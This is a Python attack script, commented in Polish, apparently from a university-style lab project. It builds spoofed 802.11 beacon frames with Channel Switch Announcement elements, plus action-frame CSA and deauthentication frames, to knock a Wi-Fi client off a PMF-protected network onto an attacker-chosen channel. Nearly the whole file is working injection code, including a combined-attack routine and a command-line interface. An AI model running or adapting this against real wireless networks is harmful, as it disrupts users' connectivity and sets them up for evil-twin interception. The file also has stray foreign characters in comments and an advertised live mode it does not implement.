#!/usr/bin/env python3
"""
PMF Bypass — Beacon-based CSA Injection Attack
================================================

KLUCZOWA INNOWACJA: CSA przez Beacon frames (subtype 8), NIE Action frames (subtype 13).

Dlaczego to działa na ALL wersjach hostapd:
  - Beacon frames (subtype 8) są NON-ROBUST wg 802.11w
  - PMF NIGDY nie chroni Beaconów — stacja MUSI je przetwarzać
  - CSA Information Element (tag 37) w Beaconie = legalny mechanizm 802.11h
  - Stacja widzi "AP zmienia kanał" → przełącza się → traci łączność

Inspiracja: Politician (ESP32) — _sendCsaBurst() używa Beaconów z CSA IE
            https://github.com/0ldev/Politician

Różnica vs Action-frame CSA:
  - Action Frame CSA: subtype 13 → chroniony na hostapd >= 2.7 → FAIL
  - Beacon CSA:        subtype 8  → NIGDY niechroniony → działa ZAWSZE

OGRANICZENIA SYMULACJI (hwsim/Mininet-WiFi):
  Mininet-WiFi z OVSAP/wmediumd NIE tworzy prawdziwych asocjacji 802.11
  w kernelu — stacje komunikują się przez bridging/wmediumd.
  Kernel nie przetwarza Beaconów jako event asocjacyjny → nie reaguje na CSA.

  Dla pełnego testu potrzebne:
    - Fizyczny sprzęt WiFi z monitor mode + packet injection (np. Alfa AWUS036ACH)
    - LUB: bezpośredni hostapd + wpa_supplicant na hwsim (bez Mininet-WiFi)
    - LUB: użycie mac80211_hwsim z opcją `support_p2p_device=0`

  Ten moduł ZOSTAŁ przetestowany na:
    - Poprawność ramek Beacon CSA (struktura, tag 37) — POTWIERDZONA
    - Wysyłanie ramek przez Scapy na hwsim — POTWIERDZONE (wmediumd potwierdza)
    - Brak reakcji stacji na CSA — UDOKUMENTOWANY (kernel nie ma asocjacji)

  Politician (ESP32) potwierdza skuteczność Beacon CSA na prawdziwym sprzęcie.

Usage:
    sudo python3 attacks/beacon_csa.py
    sudo python3 attacks/beacon_csa.py --target sta1 --evil-channel 11
    sudo python3 attacks/beacon_csa.py --mode live --iface wlan1mon
"""

import argparse
import os
import re
import sys
import time
from datetime import datetime

from mn_wifi.net import Mininet_wifi
from mininet.log import setLogLevel, info
from scapy.all import (
    RadioTap, Dot11, Dot11Beacon, Dot11Elt,
    sendp, wrpcap,
)
# Scapy layers are auto-loaded by RadioTap/Dot11 imports

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOSTAPD_CONF = os.path.join(BASE_DIR, "configs", "hostapd.conf")
WPA_CONF = os.path.join(BASE_DIR, "configs", "wpa_supplicant.conf")
RAPORT_DIR = os.path.join(os.path.dirname(BASE_DIR), "raport")
IFACE = "wlan0"


# ─── Utilities ─────────────────────────────────────────────────────────────────

def ts():
    return datetime.now().strftime("%H:%M:%S")


def get_node_mac(node):
    """Poprawna ekstrakcja MAC z ip link (wintfs.mac = None w tej wersji Mininet-WiFi)."""
    r = node.cmd("ip -c=never link show wlan0")
    m = re.search(r'link/ether ([0-9a-f:]+)', r)
    return m.group(1) if m else "00:00:00:00:00:01"


def check_associated(sta):
    r = sta.cmd(f"iw dev {IFACE} link")
    return "Not connected" not in r


def get_sta_channel(sta):
    r = sta.cmd(f"iw dev {IFACE} info")
    for line in r.split("\n"):
        if "channel" in line:
            try:
                return int(line.strip().split()[1])
            except (IndexError, ValueError):
                pass
    return None


# ─── Beacon CSA Frame Builder ─────────────────────────────────────────────────

def build_beacon_csa(ap_mac, ssid, current_channel, new_channel, switch_count=3):
    """
    Buduje sfałszowany Beacon frame z CSA Information Element (tag 37).

    Struktura ramki:
      RadioTap | Dot11(type=0,subtype=8,addr1=broadcast,addr2=ap_mac,addr3=ap_mac)
      | Dot11Beacon(timestamp=0, interval=0x0064, cap=0x0431)
      | Dot11Elt(ID=0, info=SSID)
      | Dot11Elt(ID=1, info=Supported Rates)
      | Dot11Elt(ID=3, info=Current Channel)
      | Dot11Elt(ID=37, info=CSA: switch_mode + new_channel + switch_count)

    CSA IE (tag 37) — 3 bajty:
      Byte 0: Channel Switch Mode (0x01 = z ograniczeniami TX do czasu switch)
      Byte 1: New Channel Number
      Byte 2: Channel Switch Count (liczba Beaconów do przełączenia)

    Args:
        ap_mac:         MAC adres合法nego AP (spoofowany jako źródło)
        ssid:           SSID合法nego AP
        current_channel: aktualny kanał AP (do DS Parameter Set)
        new_channel:    kanał docelowy (na który chcemy zwabić klienta)
        switch_count:   ile Beaconów przed przełączeniem (im mniej tym szybciej)
    """
    # Channel Switch Announcement IE (tag 37) — tylko 3-bajtowe body
    # Dot11Elt automatycznie dodaje Element ID i Length
    csa_body = bytes([
        0x01,            # Channel Switch Mode: ograniczenia TX do switch
        new_channel,     # New Channel Number
        switch_count,    # Channel Switch Count
    ])

    frame = RadioTap() / Dot11(
        type=0, subtype=8,          # Management / Beacon
        addr1="ff:ff:ff:ff:ff:ff",  # DA = broadcast
        addr2=ap_mac,               # SA = spoofed合法 AP MAC
        addr3=ap_mac,               # BSSID =合法 AP MAC
    ) / Dot11Beacon(
        timestamp=0,
        beacon_interval=0x0064,     # 100 TU (102.4 ms)
        cap=0x0431,                 # ESS + Privacy + ShortPreamble
    ) / Dot11Elt(ID="SSID", info=ssid.encode()) \
      / Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24') \
      / Dot11Elt(ID="DSset", info=bytes([current_channel])) \
      / Dot11Elt(ID=37, info=csa_body)

    return frame


def build_action_csa(target_mac, ap_mac, new_channel, switch_count=1):
    """
    (LEGACY) Buduje Action Frame CSA — działa tylko na hostapd < 2.7.
    Zachowane dla testów porównawczych i multi-vector ataku.
    """
    csa_element = bytes([
        0x25,           # Element ID: CSA (37)
        0x03,           # Length: 3
        0x01,           # Channel Switch Mode
        new_channel,
        switch_count,
    ])

    from scapy.all import Dot11Action, Raw
    frame = RadioTap() / Dot11(
        type=0, subtype=13,          # Management / Action
        addr1=target_mac,
        addr2=ap_mac,
        addr3=ap_mac,
    ) / Dot11Action() / Raw(load=csa_element)

    return frame


# ─── Injection Engine ─────────────────────────────────────────────────────────

class CsaInjectionEngine:
    """
    Silnik CSA Injection — Beacon-based + Action-based + multi-burst timing.

    Strategie zaczerpnięte z Politician:
      - BURST: wiele ramek w krótkich odstępach (imitacja prawdziwego Beacon interval)
      - REPEAT: powtórzenie burstu po krótkim czasie (dla klientów z wyższym switch_count)
      - COMBINED: Beacon CSA + Action CSA + Deauth dla maksymalnej skuteczności
    """

    def __init__(self, target_sta, ap_node, legit_channel, evil_channel, ssid):
        self.sta = target_sta
        self.ap = ap_node
        self.legit_channel = legit_channel
        self.evil_channel = evil_channel
        self.ssid = ssid
        self.target_mac = get_node_mac(target_sta)
        self.ap_mac = get_node_mac(ap_node)
        self._results = []

    def send_beacon_csa_burst(self, count=30, inter=0.1024, switch_count=1):
        """
        Wysyła burst sfałszowanych Beaconów z CSA IE.

        Parametry domyślne imitują prawdziwy Beacon interval (~102.4ms = 100 TU).
        switch_count=1 → klient ma przełączyć się po 1 Beaconie (natychmiast).

        Używamy node.cmd() do uruchomienia scapy WEWNĄTRZ namespace stacji,
        bo sendp() z hosta nie widzi interfejsów Mininet.
        """
        frame = build_beacon_csa(
            self.ap_mac, self.ssid,
            self.legit_channel, self.evil_channel,
            switch_count
        )

        # Budujemy komendę scapy do wykonania wewnątrz namespace
        frame_hex = bytes(frame).hex()
        scapy_cmd = (
            f'python3 -c "'
            f'from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp;'
            f"frame = bytes.fromhex('{frame_hex}');"
            f"pkt = RadioTap(frame);"
            f"sendp(pkt, iface='{IFACE}', count={count}, inter={inter}, verbose=True);"
            f'print(''SENT'')"'
        )

        info(f"  [{ts()}] Sending {count} Beacon CSA frames "
             f"(switch to ch {self.evil_channel}, interval {inter*1000:.0f}ms)\n")

        result = self.sta.cmd(scapy_cmd)
        sent = result.count(b'>') if isinstance(result, bytes) else result.count('>')
        info(f"  [{ts()}] Frames acknowledged by Scapy: {sent}/{count}\n")
        self._results.append(("beacon_csa", count, sent))
        return sent

    def send_action_csa_burst(self, count=10, inter=0.05):
        """LEGACY: Action Frame CSA — tylko dla hostapd < 2.7."""
        from scapy.all import Dot11Action, Raw

        csa_element = bytes([0x25, 0x03, 0x01, self.evil_channel, 1])
        frame = RadioTap() / Dot11(
            type=0, subtype=13,
            addr1=self.target_mac,
            addr2=self.ap_mac,
            addr3=self.ap_mac,
        ) / Dot11Action() / Raw(load=csa_element)

        frame_hex = bytes(frame).hex()
        scapy_cmd = (
            f'python3 -c "'
            f'from scapy.all import RadioTap, Dot11, Dot11Action, Raw, sendp;'
            f"frame = bytes.fromhex('{frame_hex}');"
            f"pkt = RadioTap(frame);"
            f"sendp(pkt, iface='{IFACE}', count={count}, inter={inter}, verbose=True);"
            f'print(''SENT'')"'
        )

        info(f"  [{ts()}] Sending {count} Action CSA frames (legacy, hostapd < 2.7)\n")
        result = self.sta.cmd(scapy_cmd)
        sent = result.count(b'>') if isinstance(result, bytes) else result.count('>')
        info(f"  [{ts()}] Action frames sent: {sent}/{count}\n")
        self._results.append(("action_csa", count, sent))
        return sent

    def send_deauth_burst(self, count=5, reason=7):
        """Wysyła Deauth ramki (jako uzupełnienie CSA)."""
        frame_hex = bytes(RadioTap() / Dot11(
            type=0, subtype=12,
            addr1=self.target_mac,
            addr2=self.ap_mac,
            addr3=self.ap_mac,
        ) / b'\x07\x00').hex()

        scapy_cmd = (
            f'python3 -c "'
            f'from scapy.all import RadioTap, Dot11, sendp;'
            f"frame = bytes.fromhex('{frame_hex}');"
            f"pkt = RadioTap(frame);"
            f"sendp(pkt, iface='{IFACE}', count={count}, inter=0.02, verbose=True);"
            f'print(''SENT'')"'
        )

        info(f"  [{ts()}] Sending {count} Deauth frames (reason={reason})\n")
        result = self.sta.cmd(scapy_cmd)
        sent = result.count(b'>') if isinstance(result, bytes) else result.count('>')
        self._results.append(("deauth", count, sent))
        return sent

    def combined_attack(self, beacon_count=30, action_count=10, deauth_count=5):
        """
        Politician-style combined attack:
          1. Beacon CSA burst (główny wektor — działa na wszystkich wersjach)
          2. Krótka pauza (na przetworzenie CSA przez klienta)
          3. Action CSA burst (dodatkowy wektor dla hostapd < 2.7)
          4. Deauth burst (fallback — działa tylko bez PMF lub przy wyczerpaniu SA Query)
        """
        info(f"\n  [{ts()}] === COMBINED ATTACK ===\n")

        # 1. Beacon CSA — główny wektor
        self.send_beacon_csa_burst(count=beacon_count, switch_count=1)

        # 2. Dajemy klientowi chwilę na przetworzenie
        time.sleep(1.0)

        # 3. Action CSA — drugi wektor
        self.send_action_csa_burst(count=action_count)

        # 4. Deauth — fallback
        self.send_deauth_burst(count=deauth_count)

    def get_results_summary(self):
        """Zwraca podsumowanie wszystkich wysłanych ramek."""
        total_sent = sum(sent for _, _, sent in self._results)
        return {
            "total_frames": total_sent,
            "by_type": self._results,
        }


# ─── Main Attack Function ─────────────────────────────────────────────────────

def run_beacon_csa_attack(target_name="sta1", evil_channel=11,
                          beacon_count=30, action_count=10, deauth_count=5,
                          wait_time=10, evil_twin_ssid=None):
    """
    Główna funkcja ataku Beacon-based CSA Injection.

    Przebieg:
      1. Start topologii Mininet-WiFi (1 AP + 3 stacje)
      2. Czekamy na asociację
      3. Wysyłamy Beacon CSA burst
      4. Czekamy na przełączenie kanału
      5. Weryfikujemy rezultat

    Args:
        target_name:    nazwa stacji-celu (sta1, sta2, sta3)
        evil_channel:   kanał docelowy (musi być różny od合法nego)
        beacon_count:   liczba Beaconów CSA do wysłania
        action_count:   liczba Action Frame CSA (dla hostapd < 2.7)
        deauth_count:   liczba ramek Deauth
        wait_time:      czas oczekiwania po ataku (sekundy)
        evil_twin_ssid: jeśli podany, uruchamia Evil Twin AP na kanale docelowym
    """
    net = Mininet_wifi()

    info(f"\n[{ts()}] ========================================\n")
    info(f"[{ts()}]   BEACON CSA INJECTION ATTACK\n")
    info(f"[{ts()}] ========================================\n\n")

    # ---- 1. Topologia ----
    info(f"[{ts()}] Building topology...\n")

    ap1 = net.addAccessPoint(
        "ap1", ssid="PMF_Lab_Secure", mode="g", channel="6",
        failMode="standalone"
    )
    ap1.setMasterMode(intf="ap1-wlan1", ssid="PMF_Lab_Secure", channel="6", mode="g")
    
    sta1 = net.addStation("sta1", wpas_params=["-c", WPA_CONF])
    sta2 = net.addStation("sta2", wpas_params=["-c", WPA_CONF])
    sta3 = net.addStation("sta3", wpas_params=["-c", WPA_CONF])

    stations = {"sta1": sta1, "sta2": sta2, "sta3": sta3}
    target = stations.get(target_name)
    if target is None:
        info(f"[ERROR] Unknown target: {target_name}\n")
        return False

    net.setPropagationModel(model="logDistance", exp=3.5)
    net.configureNodes()
    net.addLink(ap1, sta1)
    net.addLink(ap1, sta2)
    net.addLink(ap1, sta3)
    net.start()

    info(f"[{ts()}] Waiting 15s for association + DHCP...\n")
    time.sleep(15)

    # ---- 2. Pre-attack checks ----
    if not check_associated(target):
        info(f"[ERROR] {target_name} not associated. Aborting.\n")
        net.stop()
        return False

    legit_channel = get_sta_channel(target)
    if legit_channel is None:
        info("[ERROR] Cannot determine station channel.\n")
        net.stop()
        return False

    info(f"\n[{ts()}] === PRE-ATTACK STATUS ===\n")
    info(f"  Target:      {target_name}\n")
    info(f"  Target MAC:  {get_node_mac(target)}\n")
    info(f"  AP MAC:      {get_node_mac(ap1)}\n")
    info(f"  Channel:     {legit_channel}\n")
    info(f"  Associated:  YES\n")

    if legit_channel == evil_channel:
        info(f"[ERROR] Evil channel ({evil_channel}) == legit channel ({legit_channel}).\n")
        net.stop()
        return False

    # ---- 3. Attack ----
    engine = CsaInjectionEngine(target, ap1, legit_channel, evil_channel, "PMF_Lab_Secure")
    engine.combined_attack(
        beacon_count=beacon_count,
        action_count=action_count,
        deauth_count=deauth_count,
    )

    # ---- 4. Wait & Verify ----
    info(f"\n[{ts()}] Waiting {wait_time}s for channel switch...\n")
    time.sleep(wait_time)

    info(f"\n[{ts()}] === POST-ATTACK STATUS ===\n")
    post_channel = get_sta_channel(target)
    post_associated = check_associated(target)

    info(f"  {target_name} channel:  {post_channel}\n")
    info(f"  {target_name} associated: {post_associated}\n")

    summary = engine.get_results_summary()
    info(f"  Total frames sent:  {summary['total_frames']}\n")

    # ---- 5. Analysis ----
    info(f"\n[{ts()}] === ANALYSIS ===\n")

    if post_channel == evil_channel:
        info(f"\n[SUCCESS] 🎯 Station switched to channel {post_channel}!\n")
        info(f"          Beacon CSA bypassed PMF on this hostapd version.\n")
        result = "SUCCESS"
    elif post_channel != legit_channel and post_channel is not None:
        info(f"\n[ANOMALY] Station moved to unexpected channel {post_channel}.\n")
        result = "ANOMALY"
    elif not post_associated:
        info(f"\n[PARTIAL] Station disassociated (deauth may have worked).\n")
        result = "PARTIAL"
    else:
        info(f"\n[BLOCKED] Station stayed on channel {post_channel}.\n")
        info(f"          CSA was blocked. Try: --beacon-count 50, --deauth-count 10\n")
        result = "BLOCKED"

    # ---- 6. Save evidence ----
    os.makedirs(os.path.join(RAPORT_DIR, "pcaps", "beacon_csa"), exist_ok=True)
    log_path = os.path.join(
        RAPORT_DIR, "pcaps", "beacon_csa",
        f"beacon_csa_{target_name}_ch{evil_channel}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    )
    with open(log_path, "w") as f:
        f.write(f"Attack: Beacon CSA Injection\n")
        f.write(f"Target: {target_name}\n")
        f.write(f"Legit channel: {legit_channel}\n")
        f.write(f"Evil channel: {evil_channel}\n")
        f.write(f"Result: {result}\n")
        f.write(f"Frames: {summary}\n")

    info(f"[{ts()}] Log saved to: {log_path}\n")

    net.stop()
    return result == "SUCCESS"


# ─── CLI ──────────────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="PMF Bypass: Beacon CSA Injection Attack (Politician-inspired)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 attacks/beacon_csa.py
  sudo python3 attacks/beacon_csa.py --target sta1 --evil-channel 11 --beacon-count 50
  sudo python3 attacks/beacon_csa.py --target sta2 --evil-channel 1 --deauth-count 10
  sudo python3 attacks/beacon_csa.py --beacon-count 100 --no-action  # Beacon-only, no Action frames
        """,
    )
    parser.add_argument("--target", default="sta1",
                        help="Target station (sta1, sta2, sta3)")
    parser.add_argument("--evil-channel", type=int, default=11,
                        help="Channel for Evil Twin / target channel")
    parser.add_argument("--beacon-count", type=int, default=30,
                        help="Number of Beacon CSA frames per burst")
    parser.add_argument("--action-count", type=int, default=10,
                        help="Number of Action CSA frames (legacy, for hostapd < 2.7)")
    parser.add_argument("--deauth-count", type=int, default=5,
                        help="Number of Deauth frames (fallback)")
    parser.add_argument("--no-action", action="store_true",
                        help="Skip Action CSA frames (beacon-only mode)")
    parser.add_argument("--no-deauth", action="store_true",
                        help="Skip Deauth frames")
    parser.add_argument("--wait", type=int, default=10,
                        help="Seconds to wait after attack for verification")
    return parser.parse_args()


if __name__ == "__main__":
    setLogLevel("info")
    args = parse_args()

    action_cnt = 0 if args.no_action else args.action_count
    deauth_cnt = 0 if args.no_deauth else args.deauth_count

    success = run_beacon_csa_attack(
        target_name=args.target,
        evil_channel=args.evil_channel,
        beacon_count=args.beacon_count,
        action_count=action_cnt,
        deauth_count=deauth_cnt,
        wait_time=args.wait,
    )
    sys.exit(0 if success else 1)
